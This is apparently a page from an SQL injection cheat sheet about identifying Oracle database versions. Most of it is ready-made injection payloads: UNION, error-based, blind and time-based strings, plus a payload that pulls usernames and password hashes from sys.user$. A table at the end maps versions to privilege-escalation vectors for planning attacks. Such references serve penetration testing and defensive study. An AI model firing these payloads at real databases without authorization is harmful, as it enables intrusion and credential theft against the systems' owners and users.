---
title: Testing Version
description: Methods to determine the version of Oracle database
category: Basics
order: 3
tags: ["version", "enumeration", "reconnaissance"]
lastUpdated: 2023-03-15
---

## Testing Version

Identifying the Oracle database version is a crucial first step in SQL injection testing. Different Oracle versions have different features, vulnerabilities, and syntax support, which can significantly impact your testing strategy.

### Version Information Queries

Oracle provides several ways to retrieve version information:

| Method | Description | Example Output |
|--------|-------------|----------------|
| `SELECT BANNER FROM v$version` | Full version string | Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production |
| `SELECT VERSION FROM v$instance` | Short version number | 19.0.0.0.0 |
| `SELECT * FROM v$version` | Complete version details | Multiple rows with component details |
| `SELECT BANNER_FULL FROM v$version` | Full version with patches (12c+) | Oracle Database 19c Enterprise Edition Release 19.9.0.0.0 - Production Version 19.9.0.0.0 |

### Basic Version Queries

```sql
-- Most common method
SELECT BANNER FROM v$version WHERE ROWNUM=1

-- Alternative method
SELECT VERSION FROM v$instance

-- Multiple information at once
SELECT BANNER, VERSION, VERSION_FULL, VERSION_LEGACY FROM v$instance
```

### Component Version Information

```sql
-- Get product component versions
SELECT * FROM product_component_version

-- Get feature usage info (needs higher privileges)
SELECT * FROM dba_feature_usage_statistics
```

### SQL Injection Examples

#### UNION-Based Version Detection

```sql
-- Basic UNION attack
' UNION SELECT BANNER,NULL FROM v$version WHERE ROWNUM=1--

-- Multi-column output
' UNION SELECT NULL,BANNER,NULL,NULL FROM v$version--
```

#### Error-Based Version Detection

```sql
-- Using error messages to extract version
' AND (SELECT UPPER(BANNER) FROM v$version WHERE ROWNUM=1)='ORACLE'--

-- Forcing error with version info
' AND CTXSYS.DRITHSX.SN(1,(SELECT BANNER FROM v$version WHERE ROWNUM=1))=1--
```

#### Blind Version Detection

For blind SQL injection scenarios, character-by-character extraction:

```sql
-- Check if first character of version is 'O'
' AND ASCII(SUBSTR((SELECT BANNER FROM v$version WHERE ROWNUM=1),1,1))=79--
```

For time-based blind:

```sql
-- Add delay if first character is 'O'
' AND (CASE WHEN ASCII(SUBSTR((SELECT BANNER FROM v$version WHERE ROWNUM=1),1,1))=79 THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
```

### Version-Specific Testing

Different Oracle versions have different vulnerabilities and features:

#### Oracle 8i (8.1.7) and Earlier

```sql
-- Check for Oracle 8
' AND TO_NUMBER(SUBSTR(BANNER,INSTR(BANNER,' ')+1,1))=8--

-- Oracle 8-specific system tables
' UNION SELECT username,password FROM sys.user$--
```

#### Oracle 9i (9.0.1 - 9.2.0)

```sql
-- Check for Oracle 9i
' AND INSTR(BANNER,'9i')>0--

-- Oracle 9i features
' AND (SELECT COUNT(*) FROM all_registry_banners WHERE BANNER LIKE '%9i%')>0--
```

#### Oracle 10g (10.1 - 10.2)

```sql
-- Check for Oracle 10g
' AND INSTR(BANNER,'10g')>0--

-- Oracle 10g specific views
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='SCHEDULER$_JOB'--
```

#### Oracle 11g (11.1 - 11.2)

```sql
-- Check for Oracle 11g
' AND INSTR(BANNER,'11g')>0--

-- Oracle 11g specific feature (case-sensitive passwords)
' AND (SELECT COUNT(*) FROM v$parameter WHERE name='sec_case_sensitive_logon')>0--
```

#### Oracle 12c (12.1 - 12.2)

```sql
-- Check for Oracle 12c
' AND INSTR(BANNER,'12c')>0--

-- Check for pluggable database feature (12c+)
' AND (SELECT COUNT(*) FROM v$pdbs)>0--
```

#### Oracle 18c/19c/21c

```sql
-- Check for Oracle 19c
' AND INSTR(BANNER,'19c')>0--

-- Check for newer features
' AND (SELECT COUNT(*) FROM v$option WHERE parameter='Autonomous Database')>0--
```

### Oracle Edition Detection

Oracle comes in different editions (Enterprise, Standard, Express):

```sql
-- Checking for Enterprise Edition
' AND INSTR(BANNER,'Enterprise')>0--

-- Checking for Express Edition
' AND INSTR(BANNER,'Express')>0--
```

### PL/SQL Version Detection

PL/SQL version might differ from database version:

```sql
-- Get PL/SQL version
' UNION SELECT comp_name,version FROM dba_registry WHERE comp_id='CATALOG'--
```

### Oracle Application Server Detection

```sql
-- Check for Oracle Application Server
' UNION SELECT comp_name,version FROM dba_registry WHERE comp_id='APEX'--
```

### Practical Considerations

#### Version-based Attack Planning

Once you know the version, you can plan more targeted attacks:

| Version | Potential Vectors |
|---------|-------------------|
| 8i, 9i | Older PL/SQL package vulnerabilities |
| 10g | PL/SQL injection, SYS.DBMS_EXPORT_EXTENSION |
| 11g | DBMS_JVM_EXP_PERMS privilege escalation |
| 12c+ | More restrictive by default, need targeted approaches |

#### Detection Accuracy

Some environments might hide version information:

```sql
-- Check if version is being masked
' AND (SELECT COUNT(*) FROM v$version WHERE BANNER LIKE '%Production%')>0--
```

